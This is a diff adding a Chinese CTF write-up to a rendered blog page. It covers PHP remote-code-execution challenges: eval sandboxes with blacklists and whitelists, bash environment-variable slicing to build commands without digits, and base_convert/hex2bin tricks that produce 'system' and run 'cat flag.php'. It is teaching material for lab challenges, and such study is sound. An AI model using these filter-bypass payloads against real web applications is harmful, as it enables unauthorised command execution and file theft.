+        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先我们复习一下题目中出现的两个函数：</p>
+<pre class="line-numbers language-none"><code class="language-none">ob_get_contents — 返回输出缓冲区的内容
+ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>题目的意思就是说当我们执行完代码的输出的字母字符和数字字符全部替换成’?’。这里我们直接在代码后面加上exit();直接退出就好。</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">post:
+c&#x3D;include(&#39;&#x2F;flag.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>奇技淫巧</strong></p>
+<p>当我们面对一些各种过滤的情况的时，我们可以通过linux（大部分的服务器都是linux系统）的环境变量进行绕过，这里介绍几种默认的环境变量</p>
+<table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DISPLAY</td>
+<td align="center">用来设置将图形显示到何处。</td>
+</tr>
+<tr>
+<td align="center">HOME</td>
+<td align="center">当前用户的主目录。</td>
+</tr>
+<tr>
+<td align="center">IFS</td>
+<td align="center">内部域分隔符。</td>
+</tr>
+<tr>
+<td align="center">LANG</td>
+<td align="center">LANG可以让系统支持多语言。例如，将LANG设为pt_BR，则可以支持(巴西)葡萄牙语。</td>
+</tr>
+<tr>
+<td align="center">PATH</td>
+<td align="center">指定Shell命令的路径。</td>
+</tr>
+<tr>
+<td align="center">PWD</td>
+<td align="center">当前所在目录，即 cd 到的目录。</td>
+</tr>
+<tr>
+<td align="center">RANDOM</td>
+<td align="center">生成一个介于 0 和 32767 之间的随机数。</td>
+</tr>
+<tr>
+<td align="center">TERM</td>
+<td align="center">设置终端类型。</td>
+</tr>
+<tr>
+<td align="center">TZ</td>
+<td align="center">时区。可以是AST(大西洋标准时间)或GMT(格林尼治标准时间)等。</td>
+</tr>
+<tr>
+<td align="center">UID</td>
+<td align="center">以数字形式表示的当前用户ID，shell启动时会被初始化。</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-none"><code class="language-none">root@Kfzz1~# echo $&#123;PWD&#125;  &#x2F;&#x2F; &#x2F;root 即当前目录
+root@Kfzz1~# echo $&#123;PWD:0&#125; &#x2F;&#x2F; &#x2F;root 
+root@Kfzz1~# echo $&#123;PWD:0:1&#125; &#x2F;&#x2F; &#x2F; 表示从0下标开始的第一个字符
+root@Kfzz1~# echo $&#123;PWD:~0:1&#125; &#x2F;&#x2F; t 从结尾开始往前的第一个字符，与下面那种方法结果相同
+root@Kfzz1~# echo $&#123;PWD:~0&#125; &#x2F;&#x2F; t 
+root@Kfzz1~# echo $&#123;PWD:~1&#125; &#x2F;&#x2F; ot
+
+重点在于root@Kfzz1# echo $&#123;PWD:~A&#125; &#x2F;&#x2F; t 因为字母不管大小写都被解析成0，所以就可以组成无数字payload
+
+root@Kfzz1~# echo $&#123;PATH&#125; &#x2F;&#x2F; &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin 
+root@Kfzz1~# echo $&#123;PATH:~A&#125; &#x2F;&#x2F; n 这样我们就可以构造出一些字符进行拼接了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过以上内容的学习，又因为我们所访问的网站处于’/var/www/html’目录下，所以我们可以通过类似于PATH和PWD环境变量去构造’nl’命令去读取文件。</p>
+<p>这里再介绍一些常用但稍微难理解的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">root@Kfzz1~# echo $&#123;HOME&#125; &#x2F;&#x2F; &#x2F;root home目录名
+root@Kfzz1~# echo $&#123;TERM&#125; &#x2F;&#x2F; xterm xterm是一个X Window System上的标准虚拟终端。用户可以在同一个显示器上开启许多xterm，每一个都为其中运行的进程提供独立的输入输出（一般来说此进程是Unix shell）。 有些linux可能会是xterm-256color。
+
+SHLVL代表shell打开的深度，进程第一次打开shell时$SHLVL&#x3D;1，然后在此shell中再打开一个shell时$SHLVL&#x3D;2。
+
+“#”代表取位数
+$&#123;#&#125;为添加到shell的参数个数，$&#123;##&#125;则为值
+
+root@Kfzz1~# echo $&#123;#&#125; &#x2F;&#x2F; 0
+root@Kfzz1~# echo $&#123;##&#125; &#x2F;&#x2F; 1
+root@Kfzz1~# echo $&#123;###&#125; &#x2F;&#x2F; 0 
+root@Kfzz1~# echo $&#123;####&#125; &#x2F;&#x2F; 0
+
+$&#123;#IFS&#125;
+$&#123;#IFS&#125;在ubuntu等系统中值为3，在kali中测试值为4
+
+$&#123;?&#125;: $? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)
+
+&quot;OS error code   1:  Operation not permitted&quot;
+&quot;OS error code   2:  No such file or directory&quot;
+&quot;OS error code   3:  No such process&quot;
+&quot;OS error code   4:  Interrupted system call&quot;
+&quot;OS error code   5:  Input&#x2F;output error&quot;
+&quot;OS error code   6:  No such device or address&quot;
+&quot;OS error code   7:  Argument list too long&quot;
+&quot;OS error code   8:  Exec format error&quot;
+&quot;OS error code   9:  Bad file descriptor&quot;
+&quot;OS error code  10:  No child processes&quot;
+ 
+ $RANDOM 这个变量，可以随机生成 0~32767之间的整数数字
+
+首先来理解一下 $&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; &#x2F;&#x2F; nl
+
+再来 $&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; &#x2F;&#x2F; ll 或者 l&#x2F; 或者 &#x2F;l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里还总结了一些其他可以利用的点</p>
+<pre class="line-numbers language-none"><code class="language-none">在构造命令的时候我们要想方设法的去找我们可以利用的东西
+比如我们要执行&#x2F;bin&#x2F;cat命令，而我们之前的方法中并没有能够利用的c，at字符。
+这里有个小机器就是默认的Web管理账号名字都是www-data，这里大家如果用的是云服务器搭建的博客的话，在安装nginx的时候会自动创建一个为WWW-data的账户，所以我们用$&#123;USER&#125;可以获得“www-data”，而我们要取到at的话需要$&#123;USER:~2:2&#125;。
+当数字被过滤的时候我们可以看看http头部中有时间信息、PHP版本信息、服务器的一些信息等，都可以进行利用，比如PHP版本是7.3.22的这里我们就有数字2了
+
+$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; &#x2F;&#x2F;$&#123;USER:~2:2&#125; &lt;&#x3D;&gt; at<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="RCE-10"><a href="#RCE-10" class="headerlink" title="RCE 10"></a>RCE 10</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">//例子 c=20-1</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">//帮你算出答案</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分析一波源码，get传参c，并且长度不能超过80，设置了黑名单和白名单和正则过滤。按照提示我们去找找一些数学函数进行使用，这么多白名单也注定了有多种payload，这里我使用base_convert()和getallheaders配合使用。</p>
+<p>base_convert() 函数在任意进制之间转换数字。</p>
+<p>base_convert(number,frombase,tobase);</p>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">number</td>
+<td align="center">必需。规定要转换的数。</td>
+</tr>
+<tr>
+<td align="center">frombase</td>
+<td align="center">必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。tobase    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</td>
+</tr>
+</tbody></table>
+<p>getallheaders——-取得所有HTTP请求标头</p>
+<p>payload1：</p>
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 
+
+base_convert(1751504350,10,36)  &#x3D;&#x3D;&#x3D; system
+base_convert($pi(8768397090111664438,10,30) &#x3D;&#x3D;&#x3D; getallheaders
+
+1:cat flag.php
+payload的意思就是$pi&#x3D;system(从头文件中获取一个参数“1”的值)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="4.jpg"></p>
+<p>payload2:</p>
+<pre class="line-numbers language-none"><code class="language-none">$log&#x3D;$base_convert(37907361743, 10,36)(dechex(1598506324);$$log[&#39;sqrt&#39;]($$log[&#39;sin&#39;]);&amp;sqrt&#x3D;system&amp;sin&#x3D;cat flag.php
+
+# base_convert(37907361743, 10,36) &#x3D;&#x3D;&#x3D; hex2bin(把十六进制转换为ASCII字符)
+
+# dechex(1598506324)&#x3D;5f474554 是将10进制转换为16进制   &#x2F;&#x2F;如需把十六进制转换为十进制，请查看 hexdec() 函数
+
+# hex2bin(5f474554)&#x3D;_GET
+
+# $$log&#x3D;$_GET然后构造GET参数，然后带入参数求值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这是群主大佬的payload写法，很是精妙就是有点绕，但是作为习题可以锻炼一下一些函数的应用，这道题因为在字符数量上做了限制，所以应该采用第一种方法。</p>
+<p>关于远程命令执行的题目就先总结到这了，接下来还会对文件包含和文件上传还有PHP特性的题进行总结的。</p>
 
                 
             </div>
@@ -1478,7 +1757,7 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">66.7k</span>&nbsp;字
+                class="white-color">69.6k</span>&nbsp;字
             
             
             
